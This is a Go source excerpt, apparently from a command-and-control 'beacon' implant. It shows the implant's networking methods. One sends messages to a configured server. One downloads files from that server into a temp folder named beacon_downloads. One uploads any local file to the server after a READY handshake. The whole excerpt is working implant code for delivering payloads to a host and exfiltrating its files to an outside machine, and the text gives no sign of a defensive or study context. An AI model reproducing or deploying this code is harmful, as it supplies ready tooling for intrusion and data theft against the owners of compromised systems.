// Network communication methods

func (b *GoBeacon) sendTCP(message string, expectResponse bool) (string, error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", b.ServerIP, b.ServerPort), 30*time.Second)
	if err != nil {
		return "", fmt.Errorf("TCP connection failed: %v", err)
	}
	defer conn.Close()

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(message))
	if err != nil {
		return "", fmt.Errorf("TCP write failed: %v", err)
	}

	if expectResponse {
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		buffer := make([]byte, 4096)
		n, err := conn.Read(buffer)
		if err != nil {
			return "", fmt.Errorf("TCP read failed: %v", err)
		}
		return strings.TrimSpace(string(buffer[:n])), nil
	}

	return "OK", nil
}

func (b *GoBeacon) downloadFile(filename string) string {
	b.Logger.Printf("Downloading file: %s", filename)

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", b.ServerIP, b.ServerPort), 30*time.Second)
	if err != nil {
		return fmt.Sprintf("ERROR: TCP connection failed: %v", err)
	}
	defer conn.Close()

	message := fmt.Sprintf("to_beacon|%s", filename)
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(message))
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to send download request: %v", err)
	}

	downloadDir := filepath.Join(os.TempDir(), "beacon_downloads")
	os.MkdirAll(downloadDir, 0755)

	filePath := filepath.Join(downloadDir, filename)
	file, err := os.Create(filePath)
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to create file: %v", err)
	}
	defer file.Close()

	conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
	totalBytes, err := io.Copy(file, conn)
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to download file: %v", err)
	}

	return fmt.Sprintf("File downloaded successfully: %s (%d bytes)", filePath, totalBytes)
}

func (b *GoBeacon) uploadFile(filename string) string {
	b.Logger.Printf("Uploading file: %s", filename)

	file, err := os.Open(filename)
	if err != nil {
		return fmt.Sprintf("ERROR: File not found: %v", err)
	}
	defer file.Close()

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", b.ServerIP, b.ServerPort), 30*time.Second)
	if err != nil {
		return fmt.Sprintf("ERROR: TCP connection failed: %v", err)
	}
	defer conn.Close()

	baseName := filepath.Base(filename)
	message := fmt.Sprintf("from_beacon|%s", baseName)
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(message))
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to send upload request: %v", err)
	}

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to read server response: %v", err)
	}

	response := strings.TrimSpace(string(buffer[:n]))
	if response != "READY" {
		return fmt.Sprintf("ERROR: Server not ready: %s", response)
	}

	conn.SetWriteDeadline(time.Now().Add(5 * time.Minute))
	totalBytes, err := io.Copy(conn, file)
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to upload file: %v", err)
	}

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	n, err = conn.Read(buffer)
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to read upload response: %v", err)
	}

	finalResponse := strings.TrimSpace(string(buffer[:n]))
	return fmt.Sprintf("Upload response: %s (%d bytes sent)", finalResponse, totalBytes)
}
